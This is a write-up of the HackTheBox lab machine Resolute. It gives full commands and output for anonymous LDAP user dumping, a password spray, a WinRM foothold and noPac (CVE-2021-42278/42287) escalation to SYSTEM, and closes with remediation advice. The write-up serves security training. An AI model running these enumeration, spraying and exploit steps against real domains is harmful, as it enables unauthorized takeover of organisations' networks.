---
layout: post
title: "HackTheBox — Resolute"
date: 2026-11-08
categories: [HTB, Active Directory]
tags: [ldap-anon, password-in-description, password-spray, evil-winrm, nopac, cve-2021-42278, machineaccountquota]
description: "Anonymous LDAP user dump → password in marko's description → spray to melanie → WinRM → noPac (CVE-2021-42278/42287) to SYSTEM."
platform: "HackTheBox"
os: "Windows"
difficulty: "Medium"
---

# HackTheBox — Resolute

| Field          | Detail                      |
|----------------|-----------------------------|
| **OS**         | Windows Server 2016         |
| **Difficulty** | Medium                      |
| **Domain**     | megabank.local              |
| **IP**         | 10.129.96.155               |

---

## Summary

Resolute is an Active Directory machine that rewards careful enumeration:

- Anonymous LDAP bind leaking the full user list
- A password hidden in a user's `description` attribute
- A password spray pivoting that leak onto a different account
- WinRM access for the foothold
- Privilege escalation via noPac (CVE-2021-42278 + CVE-2021-42287) to SYSTEM

The initial access comes down to reading a field most people skip, and the path to Domain Admin is a single well-known Kerberos flaw.

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sCV -p- -vv -Pn --min-rate 4000 10.129.96.155 -oN fullport.nmap
```

The usual Active Directory port spread was present:

| Port | Service |
|------|---------|
| 53   | DNS (Simple DNS Plus) |
| 88   | Kerberos |
| 389 / 3268 | LDAP |
| 445  | SMB |
| 5985 | WinRM |

LDAP disclosed the domain `megabank.local`, and SMB identified the host as Windows Server 2016 Standard in the `MEGABANK` workgroup. With 53, 88, 445 and 3268 open, this was clearly a Domain Controller.

### Clock Sync

Kerberos is sensitive to time drift, so I synced to the DC first to avoid `KRB_AP_ERR_SKEW`:

```bash
sudo sntp -sS 10.129.96.155
```

### Hosts File

```bash
sudo nxc smb 10.129.96.155 --generate-hosts-file /etc/hosts
```

```text
10.129.96.155     RESOLUTE.megabank.local megabank.local RESOLUTE
```

### DNS Zone Transfer

```bash
dig axfr megabank.local @10.129.96.155
```

The transfer failed, so DNS was a dead end.

---

## Enumeration

### SMB

Guest access was disabled, and an anonymous session could not list shares:

```bash
nxc smb megabank.local -u guest -p ''
# STATUS_ACCOUNT_DISABLED

nxc smb megabank.local -u '' -p ''
# Error enumerating shares: STATUS_ACCESS_DENIED
```

### LDAP — Anonymous Bind

LDAP, however, allowed an anonymous bind:

```bash
nxc ldap megabank.local -u '' -p ''
```

That was enough to export every domain user:

```bash
nxc ldap megabank.local -u '' -p '' --users-export users.txt
# Writing 27 local users to users.txt
```

### AS-REP Roasting Attempt

With 27 usernames, I checked for accounts with Kerberos pre-authentication disabled:

```bash
GetNPUsers.py megabank.local/'':''@10.129.96.155 -usersfile users.txt
```

None of the accounts had `UF_DONT_REQUIRE_PREAUTH` set, so AS-REP Roasting was not an option. Back to the LDAP data.

---

## Gaining Credentials

### The Overlooked Description Field

Spraying usernames as passwords got nowhere on both SMB and LDAP:

```bash
nxc smb  megabank.local -u users.txt -p users.txt --no-brute --continue-on-success
nxc ldap megabank.local -u users.txt -p users.txt --no-brute --continue-on-success
```

Re-reading the LDAP enumeration output, a detail stood out — the `description` attribute on **marko** contained a password:

```text
marko  ... Account created. Password set to Welcome123!
```

### Password Spray

`marko:Welcome123!` did not authenticate, but a password set once is often reused. I sprayed that single password across all 27 users:

```bash
nxc ldap megabank.local -u users.txt -p 'Welcome123!' -k
```

```text
[+] megabank.local\melanie:Welcome123!
```

The password belonged to **melanie**, not marko.

---

## Foothold

### BloodHound

I collected the graph with the recovered credentials:

```bash
rusthound-ce -d megabank.local -i 10.129.96.155 -u melanie -p 'Welcome123!' -c All --zip
```

BloodHound showed that `melanie` was a member of **Remote Management Users**, which grants WinRM access.

### WinRM

```bash
evil-winrm -i megabank.local -u melanie -p 'Welcome123!'
```

The user flag was readable from melanie's desktop.

---

## Privilege Escalation — noPac

### Enumerating Privileges

Checking melanie's token privileges:

```text
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```

Combined with a non-zero machine account quota, this enables noPac. I confirmed the quota:

```bash
nxc ldap megabank.local -u melanie -p 'Welcome123!' -M maq
# MachineAccountQuota: 10
```

Any authenticated user could add up to 10 machine accounts — the precondition for the attack.

### Scanning for noPac

noPac abuses CVE-2021-42278 (sAMAccountName spoofing) together with CVE-2021-42287 (KDC behaviour) to impersonate a Domain Admin. I first checked the target was exploitable:

```bash
sudo python3 scanner.py megabank.local/melanie:'Welcome123!' -dc-ip 10.129.96.155 -use-ldap
```

```text
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 10.129.96.155.
[*] Got TGT from 10.129.96.155.
```

### Exploitation

With the preconditions met, I ran the full exploit to impersonate `administrator` and drop into a shell:

```bash
sudo python3 noPac.py megabank.local/melanie:'Welcome123!' \
  -dc-ip 10.129.96.155 -dc-host RESOLUTE -shell \
  --impersonate administrator -use-ldap
```

The exploit created a temporary machine account, renamed it to collide with the DC's sAMAccountName, requested a service ticket as that account, and used S4U2self to impersonate the administrator:

```text
[*] Adding Computer Account "WIN-RFDXFTYOHIK$"
[*] Impersonating administrator
[*] Saving a user's ticket in administrator.ccache
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

Full domain compromise as `NT AUTHORITY\SYSTEM`, and the root flag was readable.

---

## Conclusion

The complete attack chain was:

1. Anonymous LDAP bind → full user list
2. Password leaked in marko's `description` attribute
3. Password spray → `melanie:Welcome123!`
4. WinRM foothold via Remote Management Users
5. noPac (CVE-2021-42278 / CVE-2021-42287) → SYSTEM

> Note: Resolute's intended route escalates through the `DnsAdmins` group after some further internal enumeration. noPac works because the DC was left unpatched with a default machine account quota — a faster path when the environment allows it.

### Remediation

- Never store passwords in LDAP `description` or other readable attributes; they are visible to any account that can bind, including anonymous ones.
- Disable anonymous LDAP binds and restrict directory read access.
- Enforce unique passwords and monitor for password spraying.
- Patch CVE-2021-42278/42287 and set `ms-DS-MachineAccountQuota` to 0 so standard users cannot add machine accounts.
